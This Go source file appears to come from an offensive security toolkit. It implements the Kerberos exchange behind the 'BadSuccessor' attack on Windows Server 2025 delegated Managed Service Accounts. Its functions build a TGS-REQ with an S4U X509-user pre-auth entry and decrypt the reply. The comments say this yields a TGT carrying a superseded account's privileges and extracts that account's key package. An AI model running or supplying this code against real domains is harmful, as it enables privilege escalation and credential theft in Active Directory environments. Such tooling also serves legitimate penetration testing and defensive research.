package dmsa

import (
	"fmt"
	"time"

	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/config"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/crypto"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/keyusage"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/messages"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// Reply is the result of a successful dMSA key-package exchange: the
// dMSA's TGT (whose PAC inherits the superseded account's SID and group
// memberships — the privilege-escalation half of BadSuccessor) plus the
// KERB-DMSA-KEY-PACKAGE from the TGS-REP's encrypted-pa-data (the
// credential-extraction half).
type Reply struct {
	Package    *KeyPackage
	Ticket     messages.Ticket
	SessionKey types.EncryptionKey // session key of the dMSA TGT
}

// KDCError is a KRB-ERROR reply from the key-package exchange. Superseded
// is set when the KDC pointed at a successor dMSA (KERB-SUPERSEDED-BY-USER
// in e-data) — that happens when the requested account was migrated, not
// when the requester lacks dMSA support.
type KDCError struct {
	Code       int32
	Text       string
	Superseded *SupersededByUser
}

// Error renders the raw KDC error; smbclient maps it to themed text.
func (e *KDCError) Error() string {
	if e.Text != "" {
		return fmt.Sprintf("KRB-ERROR %d: %s", e.Code, e.Text)
	}
	return fmt.Sprintf("KRB-ERROR %d", e.Code)
}

// BuildDMSATGSReq builds the TGS-REQ that makes a Server 2025 KDC issue a
// dMSA TGT with the KERB-DMSA-KEY-PACKAGE: an S4U2Self-style request for
// the krbtgt service with a PA-S4U-X509-USER naming the dMSA (MS-KILE
// 2.2.14: "the ticket granting service as the sname using service for
// user as defined in MS-SFU"). tgt and sessionKey are the caller's own
// TGT; the caller must be listed in the dMSA's msDS-GroupMSAMembership.
//
// The base request comes from the gokrb5 fork's NewTGSReq (proven
// AP-REQ/authenticator path); the dMSA PA-DATA is appended afterwards —
// PA-DATA sits outside the KDC-REQ-BODY, so the authenticator's body
// checksum stays valid.
func BuildDMSATGSReq(tgt messages.Ticket, sessionKey types.EncryptionKey, userName, realm, dmsaName string) ([]byte, error) {
	cfg := config.New()
	cfg.LibDefaults.DefaultRealm = realm
	cfg.LibDefaults.Forwardable = true
	cfg.LibDefaults.Canonicalize = true
	cfg.LibDefaults.NoAddresses = true // no local host addresses in the request
	cfg.LibDefaults.TicketLifetime = 10 * time.Hour
	cfg.LibDefaults.DefaultTGSEnctypeIDs = []int32{ETypeAES256, ETypeAES128, ETypeRC4}

	cName := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, userName)
	sName := types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)

	tgsReq, err := messages.NewTGSReq(cName, realm, cfg, tgt, sessionKey, sName, false)
	if err != nil {
		return nil, fmt.Errorf("build TGS-REQ: %v", err)
	}

	s4u, err := BuildS4UX509User(dmsaName, realm, tgsReq.ReqBody.Nonce, sessionKey)
	if err != nil {
		return nil, err
	}
	tgsReq.PAData = append(tgsReq.PAData, s4u)

	b, err := tgsReq.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal TGS-REQ: %v", err)
	}
	return b, nil
}

// ParseDMSATGSRep parses the KDC's answer. On a TGS-REP it decrypts the
// enc-part with the caller's TGT session key (usage 8) and extracts the
// KERB-DMSA-KEY-PACKAGE from encrypted-pa-data; a missing package is an
// error (a 2025 KDC always includes it for an authorized dMSA request).
// On a KRB-ERROR it returns *KDCError with any superseded hint attached.
func ParseDMSATGSRep(resp []byte, sessionKey types.EncryptionKey) (*Reply, error) {
	var rep messages.TGSRep
	if err := rep.Unmarshal(resp); err != nil {
		var krbErr messages.KRBError
		if err2 := krbErr.Unmarshal(resp); err2 == nil {
			return nil, &KDCError{
				Code:       krbErr.ErrorCode,
				Text:       krbErr.EText,
				Superseded: ExtractSupersededByUser(krbErr.EData),
			}
		}
		return nil, fmt.Errorf("unparseable KDC reply: %v", err)
	}

	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return nil, fmt.Errorf("unsupported session key etype %d: %v", sessionKey.KeyType, err)
	}
	dec, err := et.DecryptMessage(sessionKey.KeyValue, rep.EncPart.Cipher, keyusage.TGS_REP_ENCPART_SESSION_KEY)
	if err != nil {
		return nil, fmt.Errorf("decrypt TGS-REP: %v", err)
	}
	var encPart messages.EncKDCRepPart
	if err := encPart.Unmarshal(dec); err != nil {
		return nil, fmt.Errorf("parse TGS-REP enc-part: %v", err)
	}

	for _, pa := range encPart.EncPAData {
		if pa.PADataType != PADataTypeDMSAKeyPackage {
			continue
		}
		pkg, err := ParseKeyPackage(pa.PADataValue)
		if err != nil {
			return nil, err
		}
		return &Reply{Package: pkg, Ticket: rep.Ticket, SessionKey: encPart.Key}, nil
	}
	return nil, fmt.Errorf("TGS-REP carries no KERB-DMSA-KEY-PACKAGE (target is not a migrated dMSA)")
}
